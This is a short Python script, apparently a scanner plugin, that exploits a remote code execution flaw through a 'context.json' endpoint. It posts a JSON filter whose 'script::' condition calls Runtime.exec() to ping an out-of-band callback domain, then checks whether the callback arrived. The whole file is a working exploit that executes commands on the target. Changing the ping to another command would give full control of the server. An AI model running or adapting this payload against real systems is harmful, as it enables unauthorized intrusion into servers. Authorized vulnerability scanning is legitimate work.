import requests,re,urllib3
import sys,os
cwd=os.getcwd()
sys.path.append(cwd+'\\reverse')
from getdomain import get_domain
from getresult import get_result
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)



def scan(urls):
    gets=get_domain()
    domain=gets[0]
    token=gets[1]
    url = urls + 'context.json'
    body = '{\n"filters": [\n{\n"id": "boom",\n"filters": [\n{\n"condition": {\n"parameterValues": {\n"": "script::Runtime r = Runtime.getRuntime(); r.exec(\'ping ' + domain +'\');"\n},\n"type": "profilePropertyCondition"\n}\n}\n]\n}\n],\n"sessionId": "boom"\n}'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0'
    }
    # print(body)
    requests.post(url=url, data=body, headers=headers, timeout=8, verify=False)
    if get_result(domain,token):
        return True
    else:
        return False

